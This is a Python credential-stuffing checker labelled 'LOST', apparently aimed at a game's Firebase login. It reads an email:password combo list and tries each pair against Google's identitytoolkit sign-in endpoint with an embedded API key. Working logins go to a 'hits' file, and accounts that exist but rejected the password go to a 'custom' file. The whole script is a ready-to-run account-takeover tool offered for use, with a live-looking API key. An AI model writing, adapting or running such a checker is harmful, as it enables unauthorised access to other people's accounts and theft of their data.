import requests
import os

E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
ok = 0
fa = 0
cu = 0

logo = (f'''{G}
  _      ____   _____ _______ 
 | |    / __ \ / ____|__   __|
 | |   | |  | | (___    | |   
 | |   | |  | |\___ \   | |   
 | |___| |__| |____) |  | |   
 |______\____/|_____/   |_|
 
 {G}Discord: {B}@waxgod''')

def msg(email, password):
    global ok, fa, cu
    os.system('clear')
    print(logo)
    print(f'{B}ـ' * 40)
    print(f'''{G}[√] Hit : {B}{ok}
{B}[=] Custom : {S}{cu}
{S}[×] Wrong : {E}{fa}''')
    print(f'{B}ـ' * 40)
    print(f'{S}[+] {B}{email} {S}| {B}{password}')
    print(f'{B}ـ' * 40)

def check(email, password):
    global ok, fa, cu
    login_url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDa9vMhJ1hU486QA-VGy9sG7klJPh0-Yiw"
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    response = requests.post(login_url, json=data)

    if "idToken" in response.text:
        ok += 1
        msg(email, password)
        with open('lost_gamer_hits.txt', 'a') as file:
            file.write(f'{email}:{password}\n')
    elif 'INVALID_PASSWORD' in response.text:
        cu += 1
        msg(email, password)
        with open("lost_gamer_custom.txt", "a") as file:
            file.write(f"{email}:{password}\n")
    elif 'EMAIL_NOT_FOUND' in response.text:
        fa += 1
    else:
        fa += 1  
        msg(email, password)

os.system('cls' if os.name == 'nt' else 'clear')
print(logo)
print(f'{E}ـ' * 40)

combolist = input(f'{B}[+] Combo List Path : {G}')
print(f'{E}ـ' * 40)

with open(combolist, "r") as file:
    for line in file:
        line = line.strip()
        if not ":" in line:
            continue
        email, password = line.split(":", 1)
        check(email, password)
